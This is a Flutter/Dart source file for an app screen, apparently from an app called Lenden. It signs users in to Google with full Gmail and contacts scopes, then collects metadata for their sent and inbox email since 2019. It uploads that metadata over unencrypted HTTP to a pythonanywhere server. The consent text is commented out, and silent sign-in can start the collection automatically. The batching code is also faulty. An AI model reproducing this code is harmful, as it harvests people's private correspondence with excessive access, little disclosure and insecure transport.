import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:google_sign_in/google_sign_in.dart';
import 'package:http/http.dart' as http;

GoogleSignIn _googleSignIn = GoogleSignIn(
  // clientId:
  //     '299695343939-2rp3ltvquv8c774vvjkbu5r0nhgcn7d8.apps.googleusercontent.com',
  scopes: <String>[
    'email',
    'https://www.googleapis.com/auth/contacts.readonly',
    'https://mail.google.com/',
  ],
);

class EmailUsage extends StatefulWidget {
  const EmailUsage({super.key});

  @override
  State<EmailUsage> createState() => EmailUsageState();
}

class EmailUsageState extends State<EmailUsage> {
  bool tf = false;
//-----------------Email data retrieval------------------------------------------------
  GoogleSignInAccount? _currentUser;
  var accessToken;

  @override
  void initState() {
    super.initState();
    _googleSignIn.onCurrentUserChanged.listen((GoogleSignInAccount? account) {
      setState(() {
        tf = true;
        _currentUser = account;
      });
      if (_currentUser != null) {
        _handleGetEmail(_currentUser!);
      }
    });
    _googleSignIn.signInSilently();
  }

  Future<void> _handleGetEmail(GoogleSignInAccount user) async {
    //Getting todays date ------------------
    DateTime now = DateTime.now();
    var date = now.day;
    var month = now.month;
    var year = now.year;

    final http.Response profileData = await http.get(
      Uri.parse('https://gmail.googleapis.com/gmail/v1/users/me/profile'),
      headers: await user.authHeaders,
    );

    final Map<String, dynamic> pData =
        json.decode(profileData.body) as Map<String, dynamic>;

    var userId = pData["emailAddress"];

// -----------------------------------------------------------------sent emails------------------------------------------------------------------------------
    http.Response response = await http.get(
      Uri.parse(
          'https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=500&q="in:sent after:2019/01/01 before:$year/$month/$date'),
      headers: await user.authHeaders,
    );

    Map<String, dynamic> data =
        json.decode(response.body) as Map<String, dynamic>;

    //  'https://gmail.googleapis.com/gmail/v1/users/me/messages/$emId?format=metadata'),

    final boundary = 'batch_email';

    String _gmailUrl = 'https://www.googleapis.com/gmail/v1/users/';
    var _batchGmailUrl = Uri.parse('https://www.googleapis.com/batch/gmail/v1');

    var body = '--' + boundary + '\r\n';
    var count = 0;
    var len = data["messages"].length;
    List<String> numL = [];
    for (var id in data["messages"]) {
      count++;
      final messageUrl = '/gmail/v1/users/' +
          userId +
          '/messages/' +
          id["id"] +
          '?format=metadata';

      body += 'Content-Type: application/http\r\n';
      body += 'Content-ID: email:' + id["id"] + '\r\n\r\n';
      body += 'GET ' + messageUrl + '\r\n\r\n';
      body += '--' + boundary + '\r\n';

      if (count == 99 && len >= 100) {
        len = len - 100;
        count = 0;
        numL.add(body);
        body = '--' + boundary + '\r\n';
      } else if (len > 0 && len < 100) {
        numL.add(body);
      }
    }

    for (String s in numL) {
      var bodyAsBytes = utf8.encode(s);

      response = await http.post(_batchGmailUrl,
          headers: {
            'Authorization': 'Bearer $accessToken',
            'Host': 'www.googleapis.com',
            'Content-Type': 'multipart/mixed; boundary=$boundary'
          },
          body: bodyAsBytes);

      List<Object> dataCollected = [
        {"messages": response.body}
      ];
      var bodys = json.encode({
        'userId': userId,
        'email_log': {"list": dataCollected}
      });

      var url = Uri.parse('http://shababe.pythonanywhere.com/addEmailData/');
      print("hello1");
      try {
        var resp = await http
            .post(url,
                headers: {"Content-Type": "application/json"}, body: bodys)
            .catchError((_) => print('Logging message failed'));
        print(resp.statusCode);
      } on SocketException {
        print("error");
      }
    }
// -----------------------------------------------------------------inbox emails------------------------------------------------------------------------------
    response = await http.get(
      Uri.parse(
          'https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=500&q="in:inbox after:2019/01/01 before:$year/$month/$date'),
      headers: await user.authHeaders,
    );
    data = json.decode(response.body) as Map<String, dynamic>;
    count = 0;
    len = data["messages"].length;
    numL = [];
    for (var id in data["messages"]) {
      count++;
      final messageUrl = '/gmail/v1/users/' +
          userId +
          '/messages/' +
          id["id"] +
          '?format=metadata';

      body += 'Content-Type: application/http\r\n';
      body += 'Content-ID: email:' + id["id"] + '\r\n\r\n';
      body += 'GET ' + messageUrl + '\r\n\r\n';
      body += '--' + boundary + '\r\n';

      if (count == 99 && len >= 100) {
        len = len - 100;
        count = 0;
        numL.add(body);
        body = '--' + boundary + '\r\n';
      } else if (len > 0 && len < 100) {
        numL.add(body);
      }
    }

    for (String s in numL) {
      var bodyAsBytes = utf8.encode(s);

      response = await http.post(_batchGmailUrl,
          headers: {
            'Authorization': 'Bearer $accessToken',
            'Host': 'www.googleapis.com',
            'Content-Type': 'multipart/mixed; boundary=$boundary'
          },
          body: bodyAsBytes);

      List<Object> dataCollected = [
        {"messages": response.body}
      ];
      var bodys = json.encode({
        'userId': userId,
        'email_log': {"list": dataCollected}
      });

      var url = Uri.parse('http://shababe.pythonanywhere.com/addEmailData/');
      print("hello");
      try {
        var resp = await http
            .post(url,
                headers: {"Content-Type": "application/json"}, body: bodys)
            .catchError((_) => print('Logging message failed'));
        print(resp.statusCode);
      } on SocketException {
        print("error");
      }
    }
// -------------------------------------------------------------------------Signing out----------------------------------------------------------------------------------

    _googleSignIn.disconnect();

// ----------------------------------------------------------------------------Changing screen-------------------------------------------------------------------------------

    Navigator.of(context).pushNamed(
      '/AppUsage',
      arguments: userId,
    );
  }

  Future<void> _handleSignIn() async {
    try {
      await _googleSignIn.signIn().then((result) {
        result?.authentication.then((googleKey) {
          setState(() {
            accessToken = googleKey.accessToken;
          });
        }).catchError((err) {
          print('inner error');
        });
      }).catchError((err) {
        print('error occured');
      });
      ;
    } catch (error) {
      print(error);
    }
  }

//-----------------others---------------------------------------------------------------
  Widget titleSection = Container(
    padding: const EdgeInsets.all(10),
    child: Row(
      children: [
        Expanded(
          /*1*/
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              Wrap(
                spacing: 8.0,
                crossAxisAlignment: WrapCrossAlignment.center,
                children: const [
                  Text(
                    'Email Usage',
                    style: TextStyle(fontWeight: FontWeight.bold, fontSize: 30),
                  ),
                ],
              ),
            ],
          ),
        ),
      ],
    ),
  );

  Widget textSection = const Padding(
    padding: EdgeInsets.all(30),
    child: Text(
        "This sections asks for permission to access your email activity? This will allow us to better understand your communication patterns and help us provide more personalized and efficient support. Rest assured that your privacy will be fully respected and all information will be kept confidential. Please let us know if you have any concerns or questions before granting access.",
        softWrap: true,
        style: TextStyle(
            fontWeight: FontWeight.w500,
            fontSize: 17,
            color: Color.fromARGB(255, 79, 72, 72))),
  );

  final ButtonStyle raisedButtonStyle = ElevatedButton.styleFrom(
    foregroundColor: Colors.black87,
    backgroundColor: const Color.fromARGB(255, 163, 195, 227),
    minimumSize: const Size(150, 44),
    padding: const EdgeInsets.symmetric(horizontal: 16),
    shape: const RoundedRectangleBorder(
      borderRadius: BorderRadius.all(Radius.circular(50)),
    ),
  );

  @override
  Widget build(BuildContext context) {
    final GoogleSignInAccount? user = _currentUser;
    return Scaffold(
      appBar: AppBar(
        centerTitle: true,
        title: const Text('Lenden',
            style: TextStyle(color: Color.fromARGB(255, 255, 255, 255))),
        backgroundColor: const Color.fromARGB(255, 66, 87, 123),
      ),
      body: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        if (tf == false) ...[
          const SizedBox(
              width: double.infinity,
              height: 300.00,
              child: Image(image: AssetImage("assets/email.jpg"))),
          titleSection,
          // textSection,
          Container(
            //apply margin and padding using Container Widget.
            padding:
                const EdgeInsets.all(25), //You can use EdgeInsets like above
            margin: const EdgeInsets.all(5),
            child: ElevatedButton(
              style: raisedButtonStyle,
              onPressed: _handleSignIn,
              child: const Text('Give Permission'),
            ),
          ),
          ElevatedButton(
            child: const Text('REFRESH'),
            onPressed: () => _googleSignIn.disconnect(),
          ),
        ] else ...[
          const SizedBox(
              width: double.infinity,
              height: 300.00,
              child: Image(image: AssetImage("assets/email.jpg"))),
          const Align(
            alignment: Alignment.center,
            child: Text(
              'Processing....',
              style: TextStyle(fontSize: 35, fontWeight: FontWeight.bold),
            ),
          ),
          // const Center(child: Text("Collecting Data")),
          const SimpleDialog(
            elevation: 0.0,
            backgroundColor:
                Colors.transparent, // can change this to your prefered color
            children: <Widget>[
              Center(
                child: CircularProgressIndicator(),
              )
            ],
          )
        ]
      ]),
    );
  }
}
